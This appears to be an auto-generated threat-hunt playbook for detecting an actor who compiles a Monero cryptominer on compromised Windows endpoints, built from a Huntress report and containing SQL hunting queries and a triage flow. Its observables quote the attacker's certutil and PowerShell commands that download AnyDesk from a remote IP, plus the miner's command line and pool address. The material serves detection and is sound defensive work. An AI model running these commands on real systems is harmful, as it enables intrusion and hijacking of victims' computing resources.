---
analysis: A standard rule might flag gcc.exe, but this hunt pivots between the build
  context (user paths, specific builder strings) and the functional outcome (miner
  flags and pool traffic) to distinguish threats from legitimate developer work.
blind_spots:
- id: short-lived-compilers
  question: Whether extremely fast compiler executions are dropped by the agent
  requires: High-frequency process event logging
  risk: A minimalist compiler like TCC may finish its build in milliseconds, potentially
    failing to be logged by interval-based snapshots.
  stage: on-host-compilation
- id: injected-process-args
  question: Whether the miner arguments are visible if the code is injected
  requires: hb_process_activity with reliable command-line auditing
  risk: If the adversary injects the miner code into explorer.exe rather than launching
    it with flags, the process arguments surface will remain silent.
  stage: cryptomining-impact
coverage:
- stage: on-host-compilation
  status: covered
  steps:
  - compiler-activity-lead
- stage: cryptomining-impact
  status: covered
  steps:
  - miner-execution-search
  - mining-dns-activity
- reason: Handled in an initial access hunt focused on web server logs.
  stage: magicinfo-exploitation
  status: out_of_scope
- reason: Handled in a sibling hunt on rogue RMM software.
  stage: anydesk-deployment
  status: out_of_scope
- reason: 'Belongs to another part of the ''The Not So Silent Miner: Threat Actor
    Compiles Cryptominer on the Endpoint'' series.'
  stage: persistence-account-creation
  status: out_of_scope
- reason: 'Belongs to another part of the ''The Not So Silent Miner: Threat Actor
    Compiles Cryptominer on the Endpoint'' series.'
  stage: defender-tampering
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: Cryptominers consume significant business resources and often serve
    as the payload for exploited web applications. Detecting on-host compilation finds
    adversaries who avoid static hash-based detections by building unique binaries
    per target.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An adversary has compiled a custom Monero miner directly on an endpoint
  using .NET and C compilers before executing it as a system process to hijack compute
  resources.
labels:
- hunt
- attack.t1059.001
- attack.t1496
- attack.t1190
- attack.t1562.001
name: On-Host Miner Compilation and Resource Hijacking
parameters:
  compiler_binaries:
    default:
    - csc.exe
    - cvtres.exe
    - donut.exe
    - tcc.exe
    - cc1.exe
    - gcc.exe
    description: Filenames of compilers and .NET utilities used during the build phase.
    from:
      kind: article
      observed: '2026-09-24'
      ref: huntress-not-so-silent-miner
    type: list[string]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    from:
      kind: manual
      observed: '2026-09-24'
      ref: standard-lookback
    type: number
  mining_pool_domains:
    default:
    - auto.c3pool.org
    - c3pool.org
    - monerohash.com
    description: Mining pool domains identified in the research.
    from:
      kind: article
      observed: '2026-09-24'
      ref: huntress-not-so-silent-miner
    type: list[domain]
  scope_hosts:
    default: []
    description: Optional hostnames to focus the search; leave empty for fleet-wide.
    from:
      kind: manual
      observed: '2026-09-24'
      ref: analyst-defined
    type: list[host]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://www.huntress.com/blog/threat-actor-compiles-cryptominer
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus on servers running public-facing Java applications or content management
  systems like MagicINFO. Developer workstations may generate noise in the compiler
  query; focus triage on unusual parent processes.
references:
- name: "Huntress \u2014 The Not So Silent Miner: Threat Actor Compiles Cryptominer\
    \ on the Endpoint"
  url: https://www.huntress.com/blog/threat-actor-compiles-cryptominer
related:
- hunt: anydesk-deployment-rmm-abuse
  reason: Rogue RMM deployment is a distinct persistence and access stage handled
    in a sibling hunt.
  relation: out-of-scope-alternative
scenario:
  stages:
  - name: Samsung MagicINFO Exploitation
    observables:
    - tomcat9.exe
    - CVE-2025-4632
    - Apache Tomcat service
    slug: magicinfo-exploitation
    tactic: initial-access
    techniques:
    - T1190
  - name: AnyDesk RMM Installation
    observables:
    - certutil -urlcache -split -f http://194.87.89.30:8899/anydesk.exe
    - Invoke-WebRequest -Uri "http://194.87.89.30:8899/anydesk.exe"
    - AnyDesk.exe --set-password
    - 194.87.89.30:8899
    - C:\ProgramData\AnyDesk.exe
    slug: anydesk-deployment
    tactic: execution
    techniques:
    - T1059.001
  - name: Local Account Creation
    observables:
    - oldadministrator
    - net user creation
    slug: persistence-account-creation
    tactic: persistence
    techniques:
    - T1059.001
  - name: Defender Disablement
    observables:
    - SystemSettingsAdminFlows.exe
    slug: defender-tampering
    tactic: defense-evasion
    techniques:
    - T1562.001
  - name: On-Host Miner Compilation
    observables:
    - Silent XMR Miner Builder.exe
    - csc.exe
    - cvtres.exe
    - donut.exe
    - tcc.exe
    - cc1.exe
    - gcc.exe
    - MinGW64 toolset
    slug: on-host-compilation
    tactic: execution
    techniques:
    - T1059.001
  - name: Cryptomining Impact
    observables:
    - explorer.exe --cinit-find-x -B --algo="rx/0"
    - auto.c3pool.org:19999
    - 0d202e16408770e8b6cceb14e1e3e72946b154bf881d27fe33d0060315b30dd1
    slug: cryptomining-impact
    tactic: impact
    techniques:
    - T1496
  summary: A threat actor exploited a known Samsung MagicINFO vulnerability (CVE-2025-4632)
    to gain initial access via the Apache Tomcat service. They established persistence
    by installing AnyDesk, creating a local administrator account, and disabling Microsoft
    Defender before using a builder to compile a Monero miner directly on the endpoint
    to avoid detection of pre-built binaries.
series:
  index: 2
  slug: the-not-so-silent-miner-threat-actor-compiles-cryptominer-on-the-endpoint
  title: 'The Not So Silent Miner: Threat Actor Compiles Cryptominer on the Endpoint'
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
tlp: clear
type: investigation
---


# On-Host Miner Compilation and Resource Hijacking

This hunt identifies the high-entropy behavior of on-host compilation followed by resource hijacking. It looks for the use of SilentXMRMiner builders and associated compilers (csc.exe, tcc.exe, gcc.exe) in user-writable directories. The flow then correlates these build activities with subsequent process execution containing specific mining flags and rare DNS lookups to known mining pools like C3Pool.

## compiler-activity-lead
<!-- On-host compiler activity from user profiles -->
Identify compilers being run from user-writable directories or associated with the Silent XMR builder project.

```sqlite target=endpoint role=triage params=(scope_hosts=scope_hosts, compiler_binaries=compiler_binaries, lookback_days=lookback_days)
~~~yaml
expected: Multiple rows showing C compilers or .NET utilities running in a user Documents
  or ProgramData folder. Silence suggests no conspicuous on-host compilation occurred.
reads:
- device_hostname
- process_name
- process_path
- process_cmd_line
- parent_process_name
- user_name
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-25'
~~~
SELECT device_hostname, process_name, process_path, process_cmd_line, parent_process_name, user_name, time FROM hb_process_activity WHERE ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND (instr(',' || '{{compiler_binaries}}' || ',', ',' || LOWER(process_name) || ',') > 0 OR LOWER(process_cmd_line) LIKE '%silent xmr%') AND (LOWER(process_path) LIKE '%\\users\\%' OR LOWER(parent_process_name) LIKE '%silent xmr%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## parallel-corroboration
<!-- Corroborate with execution and network signals -->
parallel:
- → miner-execution-search
- → mining-dns-activity
join: → agent-triage

## miner-execution-search
<!-- Miner command line patterns -->
Detect the actual cryptominer process by searching for specific Monero mining flags used in the report.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days)
~~~yaml
expected: A process like explorer.exe running with explicit mining arguments. This
  is a high-confidence signal for resource hijacking.
reads:
- device_hostname
- process_name
- process_path
- process_cmd_line
- user_name
- time
silence: evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-25'
~~~
SELECT device_hostname, process_name, process_path, process_cmd_line, user_name, time FROM hb_process_activity WHERE (LOWER(process_cmd_line) LIKE '%--cinit-find-x%' OR LOWER(process_cmd_line) LIKE '%--algo=%rx/0%' OR LOWER(process_cmd_line) LIKE '%--cpu-max-threads-hint%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## mining-dns-activity
<!-- Rare DNS lookups to mining pools -->
Stack-count connections to known mining pools to isolate the beachhead host.

```sqlite target=endpoint role=baseline params=(mining_pool_domains=mining_pool_domains, lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: A host resolving a mining pool that few others in the fleet use.
prevalence:
  by: device_hostname
  key:
  - query_hostname
  rare_below: 5
reads:
- query_hostname
- device_hostname
- time
silence: not_evidence_of_absence
source: hb_dns_activity
verified: dry-run
verified_at: '2026-09-25'
~~~
SELECT query_hostname, COUNT(DISTINCT device_hostname) AS host_count, MIN(time) AS first_seen FROM hb_dns_activity WHERE (instr(',' || '{{mining_pool_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY query_hostname HAVING host_count <= 5 ORDER BY host_count ASC
```

## agent-triage
<!-- Weigh build and mining evidence -->
```agent target=hunter
cite: required
context:
- compiler-activity-lead
- miner-execution-search
- mining-dns-activity
max_iterations: 5
objective: Determine if any host shows a transition from running builder tools in
  user folders to executing a process with mining arguments and connecting to mining
  pools.
success_criteria: A verdict of malicious, suspicious, or benign per host, citing specific
  rows from each query.
tools:
- endpoint
```

## verdict-decision
<!-- Route on malicious activity -->
if~: "The agent triage verdict is malicious for at least one host based on confirmed mining command lines and build behavior." (confidence: high, judge=hunter)
then: → isolate-endpoint
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: short-lived-compilers)
else: → close-out

## isolate-endpoint
<!-- Isolate compromised host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host from the network. Collect the suspected miner binary and builder artifacts from the identified user folder.
```
→ analyst-review

## analyst-review
<!-- Analyst forensic review -->
```manual target=analyst
Review the build artifacts and mining command lines. Check the same host for Samsung MagicINFO or Apache Tomcat processes to confirm the initial access vector.
```
→ end

## close-out
<!-- Close out hunt -->
```manual target=analyst
If no malicious activity was found, record the negative result. If activity was confirmed, promote the miner-execution-search query to a standing detection rule.
```
→ end
